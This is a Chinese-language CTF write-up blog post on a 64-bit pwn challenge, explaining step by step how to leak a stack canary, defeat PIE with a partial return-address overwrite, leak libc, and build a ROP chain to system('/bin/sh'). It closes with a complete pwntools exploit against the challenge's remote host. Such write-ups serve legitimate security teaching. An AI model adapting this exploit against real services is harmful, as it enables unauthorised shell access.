---
title: Canary&PIE绕过
visitors: 阅读量
copyright: true
tags:
  - Pwn
categories:
  - Pwn
abbrlink: 4c47cc63
date: 2019-12-18 21:54:04
updated: 2019-12-18 21:54:04
password:
top:
---

> 题目涉及绕过**canary**、**PIE**保护，未了解两者知识，可到**ctf wiki**学习。

### 分析

64位保护全开的程序

![](https://raw.githubusercontent.com/skyedai910/Picbed/master/img/20191216234355.png)

IDA打开，main 函数里面调用 vul 后，直接 return 0 退出。

vul 函数业务流程：读入 fpath 地址，输出 fpath 指向的内容，输入note。分析发现 thinking_note 写入时，大于定义的大小，存在栈溢出可能（程序开了canary保护），溢出点请看图。

![](https://raw.githubusercontent.com/skyedai910/Picbed/master/img/20191216235440.png)

write_note 部分(after line 33)处理逻辑有点奇怪：当第一次输入的 note 长度不是624时，要求重新输入一次长度最长为 0x270 的 note。这里可用来读取栈上canary值，而绕过canary保护。

### leak canary

第一次 note 栈溢出覆写 canary 最低位的``\00``，让 puts 顺利打印出 canary 的值。第二次 note 复原被破坏的 canary 值，并覆写 rip 完成 rop。这里第一次栈溢出不会破坏后面几个函数栈中的canary，因为栈是向低地址增长,后面函数栈在 vul栈 的前面(低地址)，而栈溢出是向高地址覆写。

首先需要知道 thinking_note 到 canary 的距离。canary 在 rbp 的前面一个内存块中：

```
        High
        Address |                 |
                +-----------------+
                | args            |
                +-----------------+
        rip =>  | return address  |
                +-----------------+
        rbp =>  | old ebp         |
                +-----------------+
      rbp-8 =>  | canary value    |
                +-----------------+
                | 局部变量         |
        Low     |                 |								    
        Address											from ctf wiki(经作者部分修改)
```

thinking_note 在栈中的相对位置为 rbp-0x260。这里也可以利用IDA查看 vul 的栈结构(双击局部变量，打开stack view)，得出两个距离。var_8 就是 canary 值。s、r 分别是 rbp、rip 的缩写。

![](https://raw.githubusercontent.com/skyedai910/Picbed/master/img/20191217002256.png)

至此程序就等于关闭 canary 保护。泄露canary部分：

```python
print p.recvuntil("path:")
p.sendline("flag")
print p.recvuntil("len:")
p.sendline("1000")	#大于0x258且不等于0x270
payload = "A" * (0x260-8)+"B"
p.send(payload)
print p.recvuntil("B")
canary = u64(p.recv(7).rjust(8,"\x00"))
print "cancay:", hex(canary)
x = p.recvline()
```

### ret2main

由于程序开启了 PIE 保护，并不能直接将 rip 覆写为 IDA 显示的 vul 地址。但是 PIE 技术存在缺陷，就是某一条指令的后三位十六进制数的地址是不变的。但是我们也只能覆写最后两位，为什么？

checksec 的时候看到了程序是：amd64-64-little，采用小端序存储。高字节存在高地址处，然后栈是从高地址向低地址增长的，ret的末两位（低字节）自然存在栈的低地址处，即靠近rbp的那一头，所以覆盖rbp以后的两位就是覆盖了ret的末两位。举个例子🌰：

```
IDA、gdb中显示的：				   0x0123456789abcdef
实际上在内存中的样子：	<= low addr     0xefcdab8967452301		high addr =>
```

从例子中可以看到，最后34位是连在一起了，不能单独修改其中的一个。退而求其次，覆写最后两位。ret 的函数可以是 main 或者是 vul 。因为两者地址倒数第三位相同。

![](https://raw.githubusercontent.com/skyedai910/Picbed/master/img/20191217225325.png)

ret2main部分代码:

```python
p.recvuntil("(len is 624)\n")
payload = "A" * (0x260-8) 
payload += p64(canary)	#恢复破坏的canary
payload += 'a'*0x8	#overwrite rbp
payload += "\x20"
p.send(payload)
```



### leak elf_base_addr

拿到程序canary后，就可以顺便把PIE也绕过了，也就是找到程序加载的偏移。在 vul 中栈溢出，打印出 vul ret 值，然后与 0xd2e (call vul 下一行)相减得到偏移值。

至此题目就是一道普通的ret2libc题目，泄露elf偏移部分代码：

```python
print p.recvuntil("path:")
p.sendline("flag")
print p.recvuntil("len:")
p.sendline("1000")
payload = "A" * (0x260+7)+"B"
p.send(payload)
print p.recvuntil("B")
x = p.recvline()
val = u64(x[:-1].ljust(8,"\x00"))
print "val:", hex(val)
elf_base = val - val_add
print hex(elf_base)
p.recvuntil("(len is 624)\n")
payload = "A" * (0x260-8) 
payload += p64(canary)
payload += p64(0)
payload += "\x20"
p.send(payload)


puts_plt = elf_base + puts_plt_add
puts_got = elf_base + puts_got_add
pop_rdi = elf_base + pop_rdi_add
start = elf_base + start_add
```



### leak libc_base_addr

两种解决方法：

- 程序调用了 puts ，也可以覆写 rip 调用 .plt.puts 输出 .got.puts 。两个函数地址需要加上 elf_base_addr 才是当前真实地址。得到 puts 真实地址，就可以计算 libc_base_addr 。

- 在 vul 中栈溢出，覆写到 main 的 rbp，输出并获取 main ret 的值。这个值一般指向的是 __libc_start_main+240。

  经过两次 ROP，main 栈空间会变得混乱，需要结合汇编分析，或者 OD 打断点查需要溢出的长度。因为两次ROP，main 本来只执行一次的 push rbp 却执行了3次，导致栈空间混乱。下图中：黑色为正常情况下的栈空间，蓝色为两次ROP之后的栈空间结构。可以看到，main rip 顶与 vul rip 顶距离为 0x8*4 。

  ![](https://raw.githubusercontent.com/skyedai910/Picbed/master/img/20191217233539.png)

  

  OD打断点，查询到的栈空间结构：

  ![](https://raw.githubusercontent.com/skyedai910/Picbed/master/img/20191217234101.png)

  泄露libc部分代码：

  ```python
  p.recvuntil("path:")
  p.sendline("flag")
  p.recvuntil("len:")
  p.sendline("1000")
  payload = "A" * (0x260 + 8*5-1)+"B" 
  p.send(payload)
  p.recvuntil("B")
  x = p.recvuntil("please")
  print x
  main_abs = u64(x[:8].split("\n")[0].ljust(8,"\x00"))
  libc_base = main_abs - 0x20830	#(libc.symbols["__libc_start_main"] + 240)
  print hex(main_abs)
  p.recvuntil("(len is 624)\n")
  payload = "A" * (0x260-8) 
  payload += p64(canary)
  payload += 'a'*0x8
  payload += p64(main)
  p.send(payload)
  ```

  ### get_shell payload

  ret2main或者ret2vul，输入两次payload，getshell。别忘了gadget也是要加上偏移量的，使用libc中的就将上libc偏移量，使用elf(程序本身)的就加上前面泄露的PIE。

  最终EXP：

  ```python
  #coding:utf-8
  #elf => read_note
  #libc.so.6 => cp /lib/x86_64-linux-gnu/libc.so.6 libc.so.6
  from pwn import *
  
  #==================初始化加载资源===================
  context.log_level='info'
  p = remote("114.116.54.89", 10000)
  libc=ELF("./libc.so.6")
  #p = process("./read_note")
  
  #=====================IDA查询地址==================
  val_add = 0xd2e
  main_add = 0xd20
  puts_plt_add = 0x8b0
  puts_got_add = 0x202018
  pop_rdi_add = 0xe03	#gadget from elf
  
  #===================Round 1 leak canary===========
  print p.recvuntil("path:")
  p.sendline("flag")
  print p.recvuntil("len:")
  p.sendline("1000")
  payload = "A" * (0x260-8)+"B"
  p.send(payload)
  print p.recvuntil("B")
  canary = u64(p.recv(7).rjust(8,"\x00"))	#修复canary最低位
  print "cancay:", hex(canary)
  x = p.recvline()
  #===================Round 1 ret2main==============
  p.recvuntil("(len is 624)\n")
  payload = "A" * (0x260-8) 
  payload += p64(canary)
  payload += 'a'*0x8
  payload += "\x20"
  p.send(payload)
  
  #===================Round 2 leak PIE==============
  print p.recvuntil("path:")
  p.sendline("flag")
  print p.recvuntil("len:")
  p.sendline("1000")
  payload = "A" * (0x260+7)+"B"
  p.send(payload)
  print p.recvuntil("B")
  x = p.recvline()
  val = u64(x[:-1].ljust(8,"\x00"))
  print "val:", hex(val)
  elf_base = val - val_add
  print hex(elf_base)
  p.recvuntil("(len is 624)\n")
  payload = "A" * (0x260-8) 
  payload += p64(canary)
  payload += p64(0)
  payload += "\x20"
  p.send(payload)
  
  
  puts_plt = elf_base + puts_plt_add
  puts_got = elf_base + puts_got_add
  pop_rdi = elf_base + pop_rdi_add
  main = elf_base + main_add
  
  #===============Round 3 leak libc_base_addr==========
  p.recvuntil("path:")
  p.sendline("flag")
  p.recvuntil("len:")
  p.sendline("1000")
  payload = "A" * (0x260 + 8*5-1)+"B" 
  p.send(payload)
  p.recvuntil("B")
  x = p.recvuntil("please")
  print x
  main_abs = u64(x[:8].split("\n")[0].ljust(8,"\x00"))
  libc_base = main_abs - (libc.symbols["__libc_start_main"] + 240)	#-(libc.symbols["__libc_start_main"] + 240)
  print hex(main_abs)
  p.recvuntil("(len is 624)\n")
  payload = "A" * (0x260-8) 
  payload += p64(canary)
  payload += 'a'*0x8
  payload += p64(main)
  p.send(payload)
  
  bin_abs = libc_base + next(libc.search("/bin/sh"))
  sys_abs = libc_base + libc.symbols["system"]
  
  #===============Round 4 get shell====================
  p.recvuntil("path:")
  p.sendline("flag")
  p.recvuntil("len:")
  p.sendline("1000")
  payload = "A" * (0x260-8)
  payload += p64(canary)
  payload += p64(0)
  payload += p64(pop_rdi)
  payload += p64(bin_abs)
  payload += p64(sys_abs)
  
  p.send(payload)
  p.recv()
  p.recvuntil("(len is 624)\n")
  p.send('getshell!!!')
  p.interactive()
  ```

  这道题目其他WP：[橘小白](<https://blog.csdn.net/kety_gz/article/details/100516666>)、[qfrost](<http://www.qfrost.com/PWN/bugku_PWN3/>)。

